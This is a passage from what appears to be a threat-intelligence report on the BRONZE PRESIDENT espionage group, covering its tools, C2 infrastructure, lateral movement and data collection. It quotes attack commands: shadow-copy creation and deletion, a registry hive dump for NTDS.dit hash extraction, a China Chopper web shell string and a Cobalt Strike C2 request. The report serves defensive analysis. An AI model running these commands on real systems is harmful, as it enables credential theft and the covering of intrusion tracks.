height=\"auto\"\u003e\u003cbr\u003e\u003cem\u003eFigure 2. Nbtscan being used via RCSession to scan an internal IP range. (Source: Secureworks)\u003c/em\u003e\u003c/li\u003e\u003cli\u003eNmap — BRONZE PRESIDENT used this freely available network scanning tool from the C:\\PerfLogs\\ folder.\u003c/li\u003e\u003cli\u003e\u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs\" target=\"_blank\"\u003eWmiexec\u003c/a\u003e — This publicly available tool uses WMI to create SYSTEM-level shells on remote hosts.\u003c/li\u003e\u003c/ul\u003e\u003ch4\u003eLinks to other malware\u003c/h4\u003e\u003cp\u003eWhile analyzing hosts compromised by BRONZE PRESIDENT, CTU researchers identified other malware artifacts. Although there was no evidence of the group using the malware, the threat actors may have leveraged its access or capabilities during earlier phases of the intrusions. The BRONZE PRESIDENT intrusions observed by CTU researchers appear to have taken place over several months or years.\u003c/p\u003e\u003cp\u003eChina Chopper web shell files named error404.aspx included the \"eval(Request.Item[\"|\"],\"unsafe\");\" string. To successfully interact with the web shell, a threat actor sent HTTP requests that included the \"|\" parameter. The web shell files appeared to be installed during the timeframe that BRONZE PRESIDENT was active on the system (see Figure 3).\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/bltb648290115fd9b53/69300d6ebddc882f58200b2c/bronze-president-figure-03.png\" alt=\"bronze-president-figure-03.png\" height=\"auto\"\u003e\u003cp\u003e\u003cem\u003eFigure 3. Timeline of malicious tool use on a compromised host. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003cp\u003eCTU researchers identified a variety of post-compromise tools stored under %AppData% (e.g., \\AppData\\Roaming\\Temp) on several compromised systems. The widespread proliferation and use of the following tools suggest that the group likely has the knowledge and capability to use them as part of its operations:\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1\" target=\"_blank\"\u003ePowerview.ps1\u003c/a\u003e — This PowerShell-based module for network reconnaissance is part of the \u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\" target=\"_blank\"\u003ePowerSploit\u003c/a\u003e penetration testing framework.\u003c/li\u003e\u003cli\u003e\u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://www.corelan.be/index.php/2009/07/12/free-tool-find-where-ad-users-are-logged-on-into/\" target=\"_blank\"\u003ePVE Find AD User\u003c/a\u003e — This command-line tool identifies login locations of Active Directory (AD) users.\u003c/li\u003e\u003cli\u003e\u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"http://www.joeware.net/freetools/tools/adfind/\" target=\"_blank\"\u003eAdFind\u003c/a\u003e — This command-line tool conducts AD queries.\u003c/li\u003e\u003cli\u003e\u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"http://www.joeware.net/freetools/tools/netsess/\" target=\"_blank\"\u003eNetSess\u003c/a\u003e — This publicly available tool enumerates NetBIOS sessions.\u003c/li\u003e\u003cli\u003e\u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://github.com/mubix/netview\" target=\"_blank\"\u003eNetview\u003c/a\u003e — This tool enumerates networks.\u003c/li\u003e\u003cli\u003e\u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://www.teamviewer.com/\" target=\"_blank\"\u003eTeamViewer\u003c/a\u003e — This remote control and desktop-sharing tool has applications for legitimate and malicious system users. Its installation in a temporary directory alongside network reconnaissance and enumeration tools likely indicates malicious intent.\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eInitial access and working directories\u003c/h3\u003e\u003cp\u003eAt the time of detection, observed BRONZE PRESIDENT incidents had likely been ongoing for several months or even years. As a result, CTU researchers were unable to ascertain the initial access vector. In October 2019, third-party researchers \u003ca tabindex=\"0\" rel=\"noopener noreferrer\" href=\"https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations\" target=\"_blank\"\u003edescribed\u003c/a\u003e a phishing campaign that used C2 infrastructure that CTU researchers attribute to BRONZE PRESIDENT. This connection suggests that the group uses phishing emails with ZIP attachments that contain LNK files as an initial access vector.\u003c/p\u003e\u003cp\u003eDuring one intrusion, the threat actors gained administrator access to all systems within a targeted business unit and installed their remote access tools on 80% of the hosts. The group installed multiple tools within the environment, including three different tools on a strategically important server, likely to provide contingency access options (see Table 1).\u003c/p\u003e\u003cdiv class=\"table-responsive w-full overflow-x-auto\"\u003e\u003ctable border=\"1\" cellspacing=\"0\" cellpadding=\"0\"\u003e\u003ctbody\u003e\u003ctr\u003e\u003cth\u003eHOST\u003c/th\u003e\u003cth\u003eCobalt Strike\u003c/th\u003e\u003cth\u003eRCSession\u003c/th\u003e\u003cth\u003eORat\u003c/th\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eHost 1 (Server)\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eHost 2 (User PC)\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eHost 3 (User PC)\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eHost 4 (User PC)\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eHost 5 (User PC)\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eHost 6 (User PC)\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eHost 7 (User PC)\u003c/td\u003e\u003ctd valign=\"top\"\u003eX\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003e\u0026nbsp;\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\u003cp\u003e\u003cem\u003eTable 1. Remote access tools identified on infected hosts during a BRONZE PRESIDENT intrusion.\u003c/em\u003e\u003c/p\u003e\u003cp\u003eBRONZE PRESIDENT used multiple directories to install tools on compromised hosts (see Table 2).\u003c/p\u003e\u003cdiv class=\"table-responsive w-full overflow-x-auto\"\u003e\u003ctable border=\"1\" cellspacing=\"0\" cellpadding=\"0\"\u003e\u003ctbody\u003e\u003ctr\u003e\u003cth\u003eDirectory\u003c/th\u003e\u003cth\u003eAssociated tool\u003c/th\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eC:\\RECYCLER\\\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003eORat\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eC:\\Windows\\Help\\Help\\\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003eCobalt Strike\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eC:\\Windows\\debug\\WIA\\\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003eCobalt Strike\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eC:\\Windows\\Logs\\DPX\\\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003eCobalt Strike\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eC:\\PerfLogs\\\u0026nbsp;\u003c/td\u003e\u003ctd valign=\"top\"\u003eRCSession\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd valign=\"top\"\u003eC:\\Recovery\\\u003c/td\u003e\u003ctd valign=\"top\"\u003eNbtscan\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\u003cp\u003e\u003cem\u003eTable 2. Directories used by BRONZE PRESIDENT to execute or store tools.\u003c/em\u003e\u003c/p\u003e\u003ch3\u003eNetwork enumeration, lateral movement, and credential access\u003c/h3\u003e\u003cp\u003eDuring multiple intrusions, the threat actors employed various tools and techniques to understand the network environments. For example, they used Nmap to scan various internal IP address ranges and SMB ports (see Figure 4). They also relied on Nbtscan, net user, and ping commands to obtain insights and identify opportunities for lateral movement.\u003c/p\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt0f55437e894f8d8f/69300d862c96e0a89034a323/bronze-president-figure-04.png\" alt=\"bronze-president-figure-04.png\" height=\"auto\"\u003e\u003cp\u003e\u003cem\u003eFigure 4. Nmap network scanning tool use via RCSession. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003cp\u003eBRONZE PRESIDENT regularly leverages Wmiexec to move laterally. During one intrusion, the threat actors extensively used this tool to execute WMI commands on remote hosts in the environment (see Figure 5).\u003c/p\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt968fa006c33de00f/69300d98d6ccd23cb4637b2f/bronze-president-figure-05.png\" alt=\"bronze-president-figure-05.png\" height=\"auto\"\u003e\u003cp\u003e\u003cem\u003eFigure 5. Wmiexec used to execute commands on a targeted host. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003cp\u003eThey also frequently leverage net commands to connect to other hosts (see Figure 6) using compromised credentials collected during early phases of the intrusion.\u003c/p\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt7df2670a56e5061d/69300db6769c2ef5938398f0/bronze-president-figure-06.png\" alt=\"bronze-president-figure-06.png\" height=\"auto\"\u003e\u003cp\u003e\u003cem\u003eFigure 6. BRONZE PRESIDENT Nbtscan use and net commands. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003cp\u003eDuring one intrusion observed by CTU researchers, the group used the native vssadmin tool on a domain controller to create a volume shadow copy:\u003c/p\u003e\u003cpre\u003evssadmin create shadow /for=c:\u003c/pre\u003e\u003cbr\u003e\u003cp\u003eThe threat actors retrieved the NTDS.dit file from the volume shadow copy. NTDS.dit contains Active Directory data, including password hashes for all users on a domain. Extracting hashes from the NTDS.dit file requires access to the SYSTEM file in the system registry:\u003c/p\u003e\u003cpre\u003ereg save hklm\\system c:\\windows\\temp\\system.hive\u003c/pre\u003e\u003cbr\u003e\u003cp\u003eThe threat actors saved both the SYSTEM file (system.hive) and NTDS.dit in the compromised host's c:\\windows\\temp directory. These files were likely exfiltrated and exploited offline to retrieve user password hashes, which could then be cracked or used to perform pass-the-hash attacks.\u003c/p\u003e\u003ch3\u003eC2 communications and infrastructure\u003c/h3\u003e\u003cp\u003eBRONZE PRESIDENT's C2 techniques are dictated by its remote access tools. The group's primary and likely proprietary RCSession RAT communicates with a hard-coded C2 server using a custom protocol over TCP port 443. After connecting to its C2 server, RCSession checks in with an encrypted beacon and then awaits instruction. The ORat tool, which appears to be used less frequently by the group, communicates over TCP port 80 using a raw socket protocol (not HTTP).\u003c/p\u003e\u003cp\u003eThe Cobalt Strike tool has malleable C2 profiles. During one intrusion, it connected to multiple C2 domains on TCP port 80, including mail . svrchost . com, using the following request. Subsequent Cobalt Strike C2 servers included subdomains of svchosts . com, svrchost . com, and strust . club.\u003c/p\u003e\u003cpre\u003eGET /Dv9i HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\nHost: mail . svrchost . com\nConnection: Keep-Alive\nCache-Control: no-cache\u003c/pre\u003e\u003cbr\u003e\u003cp\u003eSome BRONZE PRESIDENT C2 domains analyzed by CTU researchers were hosted on infrastructure owned by Dutch VPS provider Host Sailor, Hong Kong-based New World Telecoms, and Malaysia-based Shinjiru Technology (see Figure 7). The threat actors have used discrete infrastructure clusters that share matching hosting and registration characteristics. The pattern of infrastructure hosting suggests that the group parks its domains when not in use, an operational security technique that limits exposure of the group's overall hosting infrastructure.\u003cbr\u003e\u003c/p\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt524e9b8a61556c35/69300dd6e5684907a26d9d7e/bronze-president-figure-07.png\" alt=\"bronze-president-figure-07.png\" height=\"auto\"\u003e\u003cp\u003e\u003cem\u003eFigure 7. Hosting for a subset of BRONZE PRESIDENT C2 domains. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003ch3\u003ePersistence, defensive evasion, and exfiltration\u003c/h3\u003e\u003cp\u003eSome of BRONZE PRESIDENT's malware has persistence capabilities. For example, ORat uses a WMI event consumer to maintain its presence on a compromised host. The group also creates and maintains scheduled tasks to achieve this purpose. Figure 8 shows a Sysdriver scheduled task that periodically executes a Cobalt Strike payload.\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt74f8edca5a5ab743/69300ded5dcec6c8be9defbe/bronze-president-figure-08.png\" alt=\"bronze-president-figure-08.png\" height=\"auto\"\u003e\u003cem\u003eFigure 8. BRONZE PRESIDENT scheduled task created for Cobalt Strike persistence. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003cp\u003eThe threat actors tend to install malware on a large proportion of hosts during their intrusions. However, the group exercises restraint and defensive evasion tactics to minimize opportunities for network defenders to detect or investigate its activities. For example, the threat actors deleted volume shadow copies after using them for NTDS.dit retrieval:\u003c/p\u003e\u003cpre\u003evssadmin delete shadows /for=c: /quiet\u003c/pre\u003e\u003cbr\u003e\u003cp\u003eLikewise, the group demonstrated diligence by killing local and remote processes after they had been used:\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cpre\u003etaskkill /im svchosts.exe /F\u003c/pre\u003e\u003c/li\u003e\u003cli\u003e\u003cpre\u003etaskkill /S \u0026lt;REMOTE SYSTEM NAME\u0026gt; /U \u0026lt;USERNAME\u0026gt; /P \u0026lt;PASSWORD\u0026gt; /im svchost.exe\u003c/pre\u003e\u003c/li\u003e\u003c/ul\u003e\u003cbr\u003e\u003cp\u003eBRONZE PRESIDENT targets specific data types. The threat actors use custom batch scripts to create a list of files with predefined criteria and collate the identified files into a .rar archive (see Figure 9). CTU researchers have observed BRONZE PRESIDENT batch scripts named doc.bat, xls.bat, xlsx.bat, ppt.bat, pptx.bat, pdf.bat, and txt.bat.\u003cbr\u003e\u003c/p\u003e\u003cimg src=\"https://images.contentstack.io/v3/assets/blt38f1f401b66100ad/blt09f27c66f5618007/69300dfd2e2f9d4040de201e/bronze-president-figure-09.png\" alt=\"bronze-president-figure-09.png\" height=\"auto\"\u003e\u003cp\u003e\u003cem\u003eFigure 9. Batch script (pptx.bat) used to collate and archive all .pptx files in a defined location. (Source: Secureworks)\u003c/em\u003e\u003c/p\u003e\u003cp\u003eThe group also uses the all.bat batch script to collect all files stored on a specific user's desktop. CTU researchers observed RCSession and Cobalt Strike on systems that BRONZE PRESIDENT targeted for data theft. Either of these tools could have been used to exfiltrate the archived data.\u003c/p\u003e\u003ch2\u003eConclusion\u003c/h2\u003e\u003cp\u003eBRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools such as Cobalt Strike, PlugX, ORat, and RCSession. The concurrent use of so many tools during a single intrusion suggests that the group could include threat actors with distinct tactics, roles, and tool preferences. It is likely that BRONZE PRESIDENT has additional unobserved operational tools and capabilities. CTU researchers recommend that organizations apply controls to mitigate common intrusion techniques and behaviors along with controls that address the tools and techniques discussed in this analysis.\u003c/p\u003e\u003ch2\u003eThreat indicators\u003c/h2\u003e\u003cp\u003eThe threat indicators in Table 3 are associated with BRONZE PRESIDENT threat campaigns. Note that IP addresses can be reallocated. The IP address and domains may contain malicious content, so consider the risks before opening them in a browser.\u003c/p\u003e\u003cdiv class=\"table-responsive w-full
